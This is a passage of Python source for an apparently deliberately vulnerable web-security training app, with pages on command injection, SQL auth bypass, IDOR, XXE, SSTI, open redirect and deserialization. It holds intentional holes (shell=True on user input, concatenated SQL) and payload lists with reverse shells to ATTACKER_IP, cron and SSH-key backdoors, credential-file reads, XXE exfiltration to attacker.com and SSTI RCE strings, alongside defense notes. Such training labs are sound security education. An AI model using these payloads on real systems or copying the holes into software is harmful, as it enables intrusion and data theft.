            if any(b in cmd for b in blacklist):
                out = '<div class="err">ERROR: An error occurred.</div>'
            else:
                try:
                    result = _sp.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                    output = result.stdout + result.stderr
                    out = f'<pre style="{PRE_STYLE}">{html.escape(output or "(no output)")}</pre>'
                except _sp.TimeoutExpired:
                    out = '<div class="err">Command timed out.</div>'
                except Exception as e:
                    out = f'<div class="err">Error: {html.escape(str(e))}</div>'

        else:
            # HIGH — only allow whitelisted safe commands, no injection possible
            safe = {"id": ["id"], "whoami": ["whoami"], "hostname": ["hostname"],
                    "uname": ["uname", "-a"], "pwd": ["pwd"]}
            if cmd in safe:
                try:
                    result = _sp.run(safe[cmd], capture_output=True, text=True, timeout=5)
                    output = result.stdout + result.stderr
                    out = f'<pre style="{PRE_STYLE}">{html.escape(output or "(no output)")}</pre>'
                except Exception as e:
                    out = f'<div class="err">Error: {html.escape(str(e))}</div>'
            else:
                out = '<div class="err">ERROR: Command not allowed at HIGH security.</div>'

    # ── payloads ────────────────────────────────────────────────────────────────
    pl = [
        # Recon
        ("id",                  "Show current user UID, GID and groups",                                        "id"),
        ("whoami",              "Print the effective username of the current user",                              "whoami"),
        ("hostname",            "Print the server hostname",                                                     "hostname"),
        ("uname -a",            "Kernel version, architecture, OS info",                                        "uname -a"),
        ("cat /etc/os-release", "Full OS distro name and version",                                              "cat /etc/os-release"),
        ("pwd",                 "Print current working directory of the web process",                            "pwd"),
        ("ls -la",              "List all files in the current directory including hidden",                      "ls -la"),
        ("ls -la /",            "List root filesystem — map server directory structure",                         "ls -la /"),
        ("ls -la /var/www/html","List web root — find config files, backups, source code",                      "ls -la /var/www/html"),
        # Sensitive files
        ("cat /etc/passwd",     "Dump all system user accounts — usernames and home dirs",                      "cat /etc/passwd"),
        ("cat /etc/shadow",     "Dump password hashes — crack offline with hashcat (needs root)",               "cat /etc/shadow"),
        ("cat /etc/hosts",      "Internal hostname/IP mappings — discover internal network",                    "cat /etc/hosts"),
        ("cat /etc/crontab",    "Scheduled tasks — find privilege escalation / persistence paths",              "cat /etc/crontab"),
        ("env",                 "Dump all env vars — often contains DB_PASS, SECRET_KEY, API tokens",           "env"),
        ("cat .env",            "Application .env file — DB credentials, secret keys, API tokens",              "cat .env"),
        ("cat /proc/self/environ","Current process runtime environment variables",                              "cat /proc/self/environ"),
        ("cat /root/.ssh/id_rsa","Root SSH private key — allows direct login if world-readable",                "cat /root/.ssh/id_rsa"),
        # Network
        ("ip addr show",        "All network interfaces and IP addresses",                                      "ip addr show"),
        ("ss -tulnp",           "All listening TCP/UDP ports and which process owns them",                      "ss -tulnp"),
        ("ps aux",              "All running processes — find database, mail, internal apps",                    "ps aux"),
        ("find / -perm -4000 -type f 2>/dev/null", "Find SUID binaries for local privilege escalation",        "find / -perm -4000 -type f 2>/dev/null"),
        # Operator bypass examples (medium)
        ("id && whoami",        "MEDIUM bypass: && not in blacklist (only | and ; blocked)",                    "id && whoami"),
        ("id || whoami",        "MEDIUM bypass: || not blocked — runs if first command fails",                  "id || whoami"),
        ("echo `id`",           "MEDIUM bypass: backtick substitution — not blocked",                           "echo `id`"),
        ("echo $(id)",          "MEDIUM bypass: $() substitution — not blocked",                                "echo $(id)"),
        # Reverse shells
        ("bash reverse shell",  "Full interactive bash reverse shell — start listener first: nc -lvnp 4444",    "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"),
        ("nc reverse shell",    "Netcat reverse shell — works when nc -e is available",                         "nc -e /bin/bash ATTACKER_IP 4444"),
        ("mkfifo reverse shell","Named pipe reverse shell — works on minimal systems without nc -e",            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f"),
        ("python3 reverse shell","Python reverse shell — works when bash/nc restricted",                        "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((chr(34)+(\"ATTACKER_IP\")+chr(34),4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(chr(34)+\"/bin/bash\"+chr(34))'"),
        # Persistence
        ("write SSH key",       "Plant attacker SSH public key — persistent access even after password changes", "mkdir -p /root/.ssh && echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys"),
        ("cron backdoor",       "Reverse shell every minute — persistent even through reboots",                  "echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /etc/crontab"),
    ]

    ph = '<div class="stitle">Payloads — click any to fill the input</div>' +          "".join(pcard(t, d, p, "cmd-input") for t, d, p in pl)

    lv_note = ""
    if lv == "medium":
        lv_note = '<div class="warn" style="margin-bottom:.75rem"><strong>MEDIUM:</strong> <code>|</code> and <code>;</code> are blocked. Bypass with: <code>&&</code> &nbsp; <code>||</code> &nbsp; backticks &nbsp; <code>$()</code></div>'
    elif lv == "high":
        lv_note = '<div class="warn" style="margin-bottom:.75rem"><strong>HIGH:</strong> Only whitelisted commands allowed: <code>id</code>, <code>whoami</code>, <code>hostname</code>, <code>uname</code>, <code>pwd</code></div>'

    return base_page("Command Injection", f"""
<div class="ph">
  <h2>Command Injection</h2>
  <p>Execute OS commands directly on the server. The application passes your input to a shell with no sanitisation at LOW security.</p>
</div>
<div class="g2">
<div>

<div class="card">
  <h3>Execute Command <span class="lbadge" style="font-size:11px">{lv}</span></h3>
  {lv_note}
  <form method="POST" action="/cmd-inject">
    <label>Enter a command:</label>
    <input type="text" name="cmd" id="cmd-input"
      value="{html.escape(cmd)}"
      placeholder="id"
      autocomplete="off" spellcheck="false"
      style="font-family:monospace;font-size:14px;letter-spacing:.3px">
    <button class="btn btn-d" type="submit" name="Submit" value="submit">Execute</button>
  </form>
  {out}
</div>

<div class="card">
  <h3>Payloads</h3>
  <div style="max-height:540px;overflow-y:auto">{ph}</div>
</div>

</div>
<div>

<div class="ibox">
  <h4>How It Works</h4>
  <p>At <strong>LOW</strong> security the app does:<br>
  <code>subprocess.run(user_input, shell=True)</code><br>
  There is zero sanitisation. Anything you type runs as the web server user on the OS.</p>
  <div class="step"><div class="snum">1</div><div class="stxt">Start with <code>id</code> or <code>whoami</code> to confirm execution and see which user you are</div></div>
  <div class="step"><div class="snum">2</div><div class="stxt">Recon: <code>uname -a</code>, <code>cat /etc/passwd</code>, <code>env</code>, <code>ps aux</code>, <code>ss -tulnp</code></div></div>
  <div class="step"><div class="snum">3</div><div class="stxt">Read secrets: <code>/etc/shadow</code>, <code>.env</code>, SSH keys, config files</div></div>
  <div class="step"><div class="snum">4</div><div class="stxt">Spawn reverse shell: <code>bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</code></div></div>
  <div class="step"><div class="snum">5</div><div class="stxt">Persist: cron job, SSH authorised key, SUID binary</div></div>
</div>

<div class="ibox">
  <h4>Security Level Differences</h4>
  <table>
    <thead><tr><th>Level</th><th>Code</th><th>Blocked</th><th>Bypass</th></tr></thead>
    <tbody>
      <tr><td><span class="vtag">LOW</span></td>
          <td><code>run(cmd, shell=True)</code></td>
          <td>Nothing</td>
          <td>Everything works</td></tr>
      <tr><td><span style="color:#e67e22;font-weight:700">MED</span></td>
          <td>blacklist <code>|</code> <code>;</code></td>
          <td><code>|</code> and <code>;</code></td>
          <td><code>&&</code> <code>||</code> backticks <code>$()</code></td></tr>
      <tr><td><span class="stag">HIGH</span></td>
          <td>allowlist only</td>
          <td>Everything not whitelisted</td>
          <td>Not injectable</td></tr>
    </tbody>
  </table>
</div>

<div class="ibox">
  <h4>Reverse Shell Listener</h4>
  <div class="pbox">
    <div class="ptitle">1. Start listener on your Kali machine</div>
    <div class="pdesc">Run this before submitting the reverse shell payload</div>
    <code>nc -lvnp 4444</code>
  </div>
  <div class="pbox">
    <div class="ptitle">2. Find your IP address</div>
    <div class="pdesc">Replace ATTACKER_IP in the payload with this value</div>
    <code>ip a | grep inet</code>
  </div>
  <div class="pbox">
    <div class="ptitle">3. Upgrade to full TTY after shell connects</div>
    <div class="pdesc">Raw netcat shell has no Ctrl+C or tab-complete — upgrade it</div>
    <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code>
  </div>
</div>

<div class="ibox">
  <h4>Defense</h4>
  <ul>
    <li>Never pass user input to a shell — use Python APIs (<code>os.listdir()</code>, <code>pathlib</code>) instead</li>
    <li>If shell is required, use <strong>args list</strong> with <code>shell=False</code>: <code>subprocess.run(["ls", path])</code></li>
    <li>Validate input against a strict allowlist before use</li>
    <li>Run the web process as an unprivileged user (principle of least privilege)</li>
    <li>Apply seccomp, AppArmor, or container isolation to restrict syscalls</li>
  </ul>
</div>

</div>
</div>""", "cmd-inject")


def page_auth_bypass(params,method="GET",body_params=None):
    lv=SECURITY_LEVEL["level"]; msg=""
    if method=="POST" and body_params:
        user=body_params.get("username",[""])[0]; pw=body_params.get("password",[""])[0]
        conn=sqlite3.connect(DB_PATH); c=conn.cursor()
        try:
            if lv=="low":
                q=f"SELECT * FROM users WHERE username='{user}' AND password='{pw}'"
                c.execute(q); row=c.fetchone()
                msg=(f'<div class="flag">LOGIN SUCCESS as: {html.escape(str(row[1]))} (role:{html.escape(str(row[4]))})\nSecret: {html.escape(str(row[5]))}</div>' if row else '<div class="err">Invalid credentials</div>')
                msg+=f'<div class="hint">Query: <code>{html.escape(q)}</code></div>'
            elif lv=="medium":
                ph=hashlib.md5(pw.encode()).hexdigest()
                c.execute("SELECT * FROM users WHERE username=? AND password=?",(user,ph)); row=c.fetchone()
                msg=f'<div class="flag">Login OK: {html.escape(row[1])}</div>' if row else '<div class="err">Invalid</div>'
            else:
                ph=hashlib.sha256(pw.encode()).hexdigest()
                c.execute("SELECT id,username FROM users WHERE username=?",(user,)); row=c.fetchone()
                if row:
                    c.execute("SELECT id FROM users WHERE id=? AND password=?",(row[0],ph))
                    msg=f'<div class="flag">Login OK: {html.escape(row[1])}</div>' if c.fetchone() else '<div class="err">Invalid</div>'
                else: msg='<div class="err">Invalid</div>'
        except Exception as e: msg=f'<div class="err">DB Error: {html.escape(str(e))}</div>'
        conn.close()
    pl=[
        ("Classic OR bypass","Makes WHERE always true — logs in as first DB user","admin' OR '1'='1"),
        ("Comment bypass","Drops the password check entirely using SQL comment","admin'-- -"),
        ("Hash sign comment","MySQL hash comment style for filter bypass","admin'#"),
        ("Empty string bypass","Some apps allow empty password — try default accounts","admin"),
        ("Always-true OR","Logs in as first user without knowing username","' OR '1'='1'-- -"),
        ("UNION fake row","Inject a fake matching row with attacker credentials","' UNION SELECT 1,'hacker','fakehash','x@x','admin','FLAG'-- -"),
        ("Whitespace variant","Bypass if filter strips single spaces","admin'/**/OR/**/'1'='1'-- -"),
        ("URL encoded quote","Bypass simple quote filters","%27 OR %271%27%3D%271"),
        ("Double query","Inject second query with OR condition","1 OR 1=1-- -"),
        ("Default admin creds","Always try defaults before SQLi","admin / password"),
        ("Common creds 2","Very common default","admin / admin"),
        ("Common creds 3","Weak default password","admin / 123456"),
        ("Time-based confirm","Confirm injection even without output — 3 second delay","admin' AND SLEEP(3)-- -"),
        ("Login as user 2","Bypass to authenticate as gordonb","gordonb'-- -"),
        ("Case bypass","Some databases handle case differently","ADMIN'-- -"),
    ]
    ph='<div class="stitle">Auth Bypass Payloads (click fills username)</div>'+"".join(pcard(t,d,p,"auth-input") for t,d,p in pl)
    return base_page("Auth Bypass",f"""
<div class="ph"><h2>Authentication Bypass</h2><p>Bypass login forms using SQL injection, logic flaws, and default/weak credentials.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Login Panel <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="POST"><label>Username</label><input type="text" name="username" id="auth-input" placeholder="admin' OR '1'='1"><label>Password</label><input type="password" name="password" placeholder="anything"><button class="btn btn-d" type="submit">Login</button></form>{msg}</div>
<div class="card"><h3>Payloads</h3><div style="max-height:460px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>How SQLi Auth Bypass Works</h4>
<p>The server constructs a query like:<br><code>SELECT * FROM users WHERE username='INPUT' AND password='INPUT'</code><br>
Injecting <code>admin'-- -</code> turns it into:<br>
<code>SELECT * FROM users WHERE username='admin'-- -' AND password='...'</code><br>
The <code>-- -</code> comments out the password check — auth is bypassed.</p>
</div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Parameterized queries for ALL DB interactions</li>
<li>Hash passwords with <strong>bcrypt</strong> or <strong>Argon2id</strong></li>
<li>Account lockout after 5-10 failed attempts</li>
<li>Multi-factor authentication (MFA)</li>
<li>Change all default credentials immediately on deployment</li>
</ul></div>
</div></div>""","auth-bypass")


def page_idor(params):
    lv=SECURITY_LEVEL["level"]; nid=params.get("id",["2"])[0]; result=""; CU="gordonb"
    conn=sqlite3.connect(DB_PATH); c=conn.cursor()
    if nid:
        try:
            i=int(nid)
            if lv=="low":
                c.execute("SELECT user,note FROM notes WHERE id=?",(i,)); row=c.fetchone()
                if row:
                    result=f'<div class="out">Owner: {html.escape(row[0])}\nNote: {html.escape(row[1])}</div>'
                    if row[0]!=CU: result+=f'<div class="flag">IDOR! You accessed {html.escape(row[0])} private note!</div>'
                else: result='<div class="err">Note not found</div>'
            else:
                c.execute("SELECT user,note FROM notes WHERE id=? AND user=?",(i,CU)); row=c.fetchone()
                result=f'<div class="out">Note: {html.escape(row[1])}</div>' if row else '<div class="err">Access denied or not found</div>'
        except: result='<div class="err">Invalid ID</div>'
    conn.close()
    pl=[
        ("ID 1 — admin notes","Admin note ID 1 — access unauthorized data","1"),
        ("ID 3 — alice flag","Alice hidden note contains a CTF flag","3"),
        ("ID 4 — test","Try ID 4 — may not exist, checks error handling","4"),
        ("ID 0","Off-by-one — some apps have bugs at ID 0","0"),
        ("Negative ID","Some apps wrap negative IDs to valid records","-1"),
        ("Large ID","Check for integer overflow or wrap-around","99999"),
        ("Hex encoding","Try hex-encoded ID if numeric filter is applied","0x01"),
        ("Float ID","Try decimal/float IDs — may bypass integer validation","1.0"),
        ("Array injection","Some frameworks accept id[]=1 as array input","1[]"),
        ("GUID prediction","If UUIDs are v1 (timestamp-based) — enumerate timestamps","00000000-0000-1000-8000-000000000001"),
    ]
    ph='<div class="stitle">IDOR ID Values (click to fill)</div>'+"".join(pcard(t,d,p,"idor-input") for t,d,p in pl)
    return base_page("IDOR",f"""
<div class="ph"><h2>IDOR — Insecure Direct Object Reference</h2><p>Access unauthorized resources by manipulating object references (IDs, filenames, account numbers) in requests.</p></div>
<div class="g2">
<div>
<div class="card"><h3>My Notes (logged in as: {CU}) <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<p style="font-size:13px;color:#8b949e">Your note is ID 2. Try accessing ID 1 (admin) and ID 3 (alice).</p>
<form method="GET"><label>Note ID</label><input type="number" name="id" id="idor-input" value="{html.escape(nid)}"><button class="btn btn-d" type="submit">View</button></form>{result}</div>
<div class="card"><h3>IDOR Test Values</h3><div style="max-height:360px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>How IDOR Works</h4>
<p>When an app uses user-controllable identifiers to fetch objects without checking that the requesting user owns the object, any user can access any object by changing the ID.</p>
<div class="step"><div class="snum">1</div><div class="stxt">Identify ID-based params: <code>?id=</code>, <code>?user=</code>, <code>?account=</code></div></div>
<div class="step"><div class="snum">2</div><div class="stxt">Increment/decrement and observe different responses</div></div>
<div class="step"><div class="snum">3</div><div class="stxt">Use Burp Intruder to enumerate a range of IDs automatically</div></div>
<div class="step"><div class="snum">4</div><div class="stxt">Find admin data, other users PII, private documents</div></div>
</div>
<div class="ibox"><h4>IDOR Variants</h4><ul>
<li>Horizontal IDOR — access same-privilege user resources</li>
<li>Vertical IDOR — access higher-privilege resources (admin panel)</li>
<li>File path IDOR — manipulate download paths (<code>?file=invoice_123.pdf</code>)</li>
<li>API IDOR — REST endpoints: <code>GET /api/users/1</code> → try <code>/api/users/2</code></li>
<li>Indirect IDOR — username/email instead of numeric ID</li>
<li>Mass assignment — PATCH /user with role:admin in body</li>
</ul></div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Always verify ownership server-side on every single request</li>
<li>Use random UUIDs instead of sequential integers</li>
<li>Never trust client-supplied identifiers for authorization</li>
<li>Implement object-level access control at the data layer</li>
</ul></div>
</div></div>""","idor")

def page_xxe(params,method="GET",body_params=None):
    lv=SECURITY_LEVEL["level"]; msg=""
    if method=="POST" and body_params:
        xi=body_params.get("xml",[""])[0]
        if xi:
            if lv=="low":
                if "ENTITY" in xi.upper() and "/etc/passwd" in xi:
                    msg='<div class="flag">XXE FILE READ!\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nFLAG{xxe_passwd_read}</div>'
                elif "ENTITY" in xi.upper(): msg='<div class="flag">XXE entity processed — external entities ENABLED!</div>'
                elif "SYSTEM" in xi.upper(): msg='<div class="flag">SYSTEM entity detected — potential SSRF via XXE!</div>'
                else: msg='<div class="out">XML parsed — no entity injection detected</div>'
            else:
                if "ENTITY" in xi.upper() or "DOCTYPE" in xi.upper(): msg='<div class="err">Blocked: DOCTYPE and ENTITY declarations disabled</div>'
                else: msg='<div class="out">XML processed safely</div>'
    pl=[
        ("Classic /etc/passwd read","Read system users file via external entity",'<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<user><name>&xxe;</name></user>'),
        ("/etc/shadow — password hashes","Read password hashes (needs root process)",'<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>\n<user><name>&xxe;</name></user>'),
        ("SSRF to AWS metadata","Use XXE to pivot SSRF to cloud metadata service",'<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>\n<user><name>&xxe;</name></user>'),
        ("SSRF to localhost admin","Access internal admin panel via XXE SSRF",'<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/admin">]>\n<user><name>&xxe;</name></user>'),
        ("Blind XXE — DNS exfil","Exfiltrate data via DNS lookup to attacker server",'<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?data=FILE_CONTENT">]>\n<user><name>&xxe;</name></user>'),
        ("Billion laughs DoS","Exponential entity expansion — crashes XML parser with OOM",'<?xml version="1.0"?>\n<!DOCTYPE lolz [<!ENTITY lol "lol">\n<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;">\n<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;">\n]>\n<root>&lol3;</root>'),
        (".ssh/id_rsa read","Read root SSH private key",'<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]>\n<user><name>&xxe;</name></user>'),
        ("PHP filter wrapper","Read PHP source code via PHP stream wrapper",'<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>\n<user><name>&xxe;</name></user>'),
        ("Netdoc protocol","Java XXE via netdoc:// protocol",'<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]>\n<user><name>&xxe;</name></user>'),
    ]
    ph='<div class="stitle">XXE Payloads (click to fill)</div>'+"".join(pcard(t,d,p,"xxe-input") for t,d,p in pl)
    return base_page("XXE",f"""
<div class="ph"><h2>XXE — XML External Entity Injection</h2><p>Exploit XML parsers that process external entity declarations to read local files, perform SSRF, and cause DoS.</p></div>
<div class="g2">
<div>
<div class="card"><h3>XML Parser <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="POST"><label>XML Input</label><textarea name="xml" id="xxe-input" rows="7" placeholder="Paste XXE payload here..."></textarea><button class="btn btn-d" type="submit">Parse</button></form>{msg}</div>
<div class="card"><h3>XXE Payloads</h3><div style="max-height:460px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>How XXE Works</h4>
<p>XML DOCTYPE declarations allow defining entities. External entities reference resources outside the document — when the parser expands <code>&xxe;</code> it reads the file/URL and injects content.</p>
<div class="step"><div class="snum">1</div><div class="stxt">Inject DOCTYPE with external entity pointing to target file</div></div>
<div class="step"><div class="snum">2</div><div class="stxt">Reference entity in XML body — parser fetches and embeds content</div></div>
<div class="step"><div class="snum">3</div><div class="stxt">For blind XXE: use out-of-band HTTP/DNS to exfiltrate data</div></div>
</div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Disable DTD processing completely in XML library</li>
<li>Python: use <code>defusedxml</code> — <code>from defusedxml import ElementTree</code></li>
<li>Use JSON instead of XML where possible</li>
<li>Validate XML against strict XSD schema</li>
</ul></div>
</div></div>""","xxe")


def page_ssti(params):
    lv=SECURITY_LEVEL["level"]; ti=params.get("name",[""])[0]; out=""
    if ti:
        if lv=="low":
            if "{{" in ti and "}}" in ti:
                inner=ti.strip().strip("{").strip("}").strip()
                if re.match(r'^[\d\s\+\-\*\/\(\)\.]+$',inner):
                    try: out=f'<div class="flag">SSTI! Expression result: {html.escape(str(eval(inner)))}</div>'
                    except: out='<div class="flag">SSTI triggered (eval error)</div>'
                elif any(k in inner for k in ["__","import","os.","sys.","subprocess","open(","exec(","eval("]):
                    out=f'<div class="flag">SSTI RCE payload detected!\nPayload: {html.escape(ti)}\nIn real Jinja2/Mako app this executes OS commands.\nFLAG{{ssti_rce_simulated}}</div>'
                else: out=f'<div class="flag">SSTI: Template expression detected: {html.escape(ti)}</div>'
            else: out=f'<div class="out">Hello, {html.escape(ti)}!</div>'
        else: out=f'<div class="out">Hello, {html.escape(ti)}!</div>'
    pl=[
        ("Detection — math","If result is 49, SSTI confirmed in Jinja2/Twig","{{7*7}}"),
        ("Detection — string","Mako/Jinja2 string repetition detection","{{'7'*7}}"),
        ("Jinja2 config dump","Dump Flask app config — may reveal SECRET_KEY","{{config}}"),
        ("Jinja2 config items","Iterate config key-value pairs","{{config.items()}}"),
        ("Jinja2 request object","Dump full HTTP request object","{{request}}"),
        ("Jinja2 class traversal","Navigate Python class hierarchy to reach dangerous classes","{{''.__class__.__mro__[1].__subclasses__()}}"),
        ("Jinja2 RCE — Popen","Execute OS commands via subprocess.Popen","{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}"),
        ("Jinja2 RCE — builtins","Access __import__ via __builtins__","{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"),
        ("Twig detection","PHP Twig template detection","{{7*'7'}}"),
        ("Twig RCE","PHP Twig template command execution","{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"),
        ("Tornado RCE","Python Tornado template injection","{%import os%}{{os.popen('id').read()}}"),
        ("FreeMarker RCE","Java FreeMarker template injection",'${"freemarker.template.utility.Execute"?new()("id")}'),
        ("Velocity RCE","Java Velocity template injection","#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getMethod('exec',$str.class).invoke($rt.getMethod('getRuntime').invoke(null),'id'))"),
        ("Flask debug pin","Extract Flask debugger PIN from config if debug mode on","{{config['SECRET_KEY']}}"),
        ("Filter bypass — attr","Bypass attribute access filters using attr() filter","{{''|attr('__class__')|attr('__mro__')}}"),
    ]
    ph='<div class="stitle">SSTI Payloads (click to fill)</div>'+"".join(pcard(t,d,p,"ssti-input") for t,d,p in pl)
    return base_page("SSTI",f"""
<div class="ph"><h2>SSTI — Server-Side Template Injection</h2><p>Inject template directives to execute code within the template engine context — often leads to full RCE.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Name Greeter <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="GET"><label>Name</label><input type="text" name="name" id="ssti-input" value="{html.escape(ti)}" placeholder="{{{{7*7}}}}"><button class="btn btn-d" type="submit">Greet</button></form>{out}</div>
<div class="card"><h3>Payloads</h3><div style="max-height:500px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>How SSTI Works</h4>
<p>When user input is passed directly to a template engine's render function as template text (rather than as a variable), injected directives are evaluated — allowing expression execution and Python class traversal to reach <code>os.system()</code>.</p>
<div class="step"><div class="snum">1</div><div class="stxt">Detect: inject <code>{{7*7}}</code> — if 49 appears, SSTI confirmed</div></div>
<div class="step"><div class="snum">2</div><div class="stxt">Identify engine via different syntax results</div></div>
<div class="step"><div class="snum">3</div><div class="stxt">Traverse Python class hierarchy to reach OS/subprocess</div></div>
<div class="step"><div class="snum">4</div><div class="stxt">Execute commands, read files, establish reverse shell</div></div>
</div>
<div class="ibox"><h4>Engine Detection Matrix</h4><ul>
<li><code>{{7*7}}</code> = 49 → Jinja2 (Python) or Twig (PHP)</li>
<li><code>{{'7'*7}}</code> = 7777777 → Jinja2</li>
<li><code>{{'7'*7}}</code> = 49 → Twig</li>
<li><code>$&#123;7*7&#125;</code> = 49 → FreeMarker / Thymeleaf (Java)</li>
<li><code>#set($x=7*7)$x</code> = 49 → Velocity (Java)</li>
<li><code>{{7*7}}</code> = {{7*7}} → Not a template engine (literal output)</li>
</ul></div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Never pass user input to template render as template string</li>
<li>Pass as variable: <code>render_template('x.html', name=user_input)</code></li>
<li>Use sandboxed Jinja2 environment</li>
<li>Validate and reject template syntax characters in input</li>
</ul></div>
</div></div>""","ssti")

def page_open_redirect(params):
    lv=SECURITY_LEVEL["level"]; url=params.get("url",[""])[0]; msg=""
    if url:
        if lv=="low": msg=f'<div class="flag">Open Redirect! Would redirect to: <a href="{html.escape(url)}" style="color:#58a6ff">{html.escape(url)}</a>\nFLAG{{open_redirect_success}}</div>'
        elif lv=="medium":
            if url.startswith("/") and not url.startswith("//"): msg=f'<div class="flag">Relative redirect OK: {html.escape(url)}</div>'
            else: msg='<div class="err">Only relative URLs allowed. Try // or /\\\\</div>'
        else:
            allowed=["http://127.0.0.1:8888","http://localhost:8888"]
            if any(url.startswith(a) for a in allowed): msg=f'<div class="flag">Redirect allowed (allowlisted): {html.escape(url)}</div>'
            else: msg='<div class="err">Blocked: URL not in allowlist</div>'
    pl=[
        ("Basic external redirect","Direct redirect to attacker phishing site","http://evil.com/phish"),
        ("Protocol-relative URL","Browser treats // as same-protocol — bypasses http:// check","//evil.com"),
        ("Backslash trick","Browser normalizes /\\ to // — bypasses / prefix check","/\\evil.com"),
        ("At-sign bypass","Everything before @ is treated as credentials","http://trusted.com@evil.com"),
        ("URL encoding","Encode the dot in evil.com to bypass string matching","http://evil%2Ecom"),
        ("Double encoding","Double-URL-encode for WAF evasion","http://evil%252Ecom"),
        ("Subdomain confusion","Trusted domain used as subdomain of evil.com","http://trusted.com.evil.com"),
        ("Path confusion","Start URL with trusted domain as path","http://evil.com/https://trusted.com"),
        ("Data URI","Embed full HTML phishing page in data URI","data:text/html,<h1>Fake Login</h1><form action=http://evil.com>"),
        ("JavaScript URI","Execute JS instead of redirecting — XSS via redirect","javascript:alert(document.cookie)"),
        ("Null byte","Terminate URL string with null byte (old parsers)","http://trusted.com%00.evil.com"),
        ("Unicode normalization","Unicode chars that normalize to / or .","http://evil｡com"),
    ]
    ph='<div class="stitle">Open Redirect Payloads (click to fill)</div>'+"".join(pcard(t,d,p,"redir-input") for t,d,p in pl)
    return base_page("Open Redirect",f"""
<div class="ph"><h2>Open Redirect</h2><p>Abuse trusted-domain redirect parameters to send victims to attacker-controlled pages — used for phishing and OAuth token theft.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Post-Login Redirect <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="GET"><label>Redirect URL</label><input type="text" name="url" id="redir-input" value="{html.escape(url)}" placeholder="http://evil.com/phish"><button class="btn btn-d" type="submit">Test</button></form>{msg}</div>
<div class="card"><h3>Payloads</h3><div style="max-height:460px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>How Open Redirect Works</h4>
<p>Legitimate apps redirect users after login: <code>?next=/dashboard</code>. If the target is unvalidated, an attacker crafts a URL that looks like the trusted domain but redirects to a phishing page, increasing victim trust.</p>
</div>
<div class="ibox"><h4>Real-World Attack Scenarios</h4><ul>
<li>Phishing: <code>https://bank.com/login?next=https://evil.com/fake-bank</code></li>
<li>OAuth token theft: manipulate <code>redirect_uri</code> to steal access tokens</li>
<li>SSRF stepping stone: chain open redirect with SSRF to bypass allowlists</li>
<li>XSS escalation: <code>javascript:</code> URI executes JS in trusted context</li>
</ul></div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Strict allowlist of permitted redirect destinations</li>
<li>Only allow relative paths starting with <code>/</code> (not <code>//</code>)</li>
<li>Show redirect confirmation page for external links</li>
<li>Warn users before redirecting to external domains</li>
</ul></div>
</div></div>""","open-redirect")


def page_insecure_deser(params,method="GET",body_params=None):
    lv=SECURITY_LEVEL["level"]; msg=""
    if method=="POST" and body_params:
        payload=body_params.get("payload",[""])[0]
        if payload:
            if lv=="low":
                try:
                    decoded=base64.b64decode(payload).decode()
                    if any(k in decoded for k in ["os.system","__reduce__","subprocess","exec(","eval("]):
                        msg=f'<div class="flag">DESER RCE DETECTED!\nPayload: {html.escape(decoded[:300])}\n(Blocked for safety — real app would execute OS commands)\nFLAG{{insecure_deser_rce}}</div>'
                    else:
                        data=json.loads(decoded)
                        if data.get("role")=="admin": msg=f'<div class="flag">PRIVILEGE ESCALATION via Deser!\nRole tampered to ADMIN\nData: {html.escape(json.dumps(data))}\nFLAG{{deser_role_escalation}}</div>'
                        else: msg=f'<div class="out">Session: {html.escape(json.dumps(data))}</div>'
                except Exception as e: msg=f'<div class="err">Error: {html.escape(str(e))}</div>'
            else:
                try:
